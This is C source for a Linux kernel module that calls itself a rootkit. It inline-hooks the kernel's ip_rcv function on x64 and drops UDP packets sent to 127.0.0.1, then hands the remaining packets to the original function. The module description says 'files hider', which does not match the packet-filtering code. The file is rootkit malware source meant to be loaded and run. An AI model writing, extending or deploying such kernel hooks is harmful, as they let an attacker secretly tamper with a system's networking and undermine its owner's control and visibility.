

#include "hfiles/pch.h" /* precompiled header */ 

#include "hfiles/utils64.h"
#include "hfiles/inlHook.h"
#include "hfiles/typedefs.h"

unsigned long addr;
int (*fp_ip_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
	   struct net_device *orig_dev); 


int my_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev)
{ 
    struct iphdr* ip_header =  (struct iphdr*)skb_network_header(skb); 
    unsigned char *deny_ip = "\x7f\x00\x00\x01"; // 127.0.0.1 
    
    if(ip_header->protocol == 17) 
    { 
        if(ip_header->daddr == *(unsigned int*)deny_ip){
            printk(KERN_INFO "dropping  packet..."); 
            return NET_RX_DROP; 
        } 
    } 
   
    inline_unhook_x64(); 
    fp_ip_rcv(skb, dev, pt, orig_dev);
    inline_hook_x64(fp_ip_rcv, my_ip_rcv); 

    return NET_RX_SUCCESS; 
}

static int __init rootkit_init(void) {

    addr = dumpAddr("ip_rcv"); 
    fp_ip_rcv = (unsigned long)addr; 

    inline_hook_x64(fp_ip_rcv, my_ip_rcv); 

    return 0; 
}

static void __exit rootkit_exit(void) 
{
    inline_unhook_x64();     
}
MODULE_LICENSE("GPL");
MODULE_AUTHOR("dan0xcc");
MODULE_DESCRIPTION("files hider rootkit driver"); 
MODULE_VERSION("1.00");


module_init(rootkit_init); // invokes loading 
module_exit(rootkit_exit); // invokes unloading 



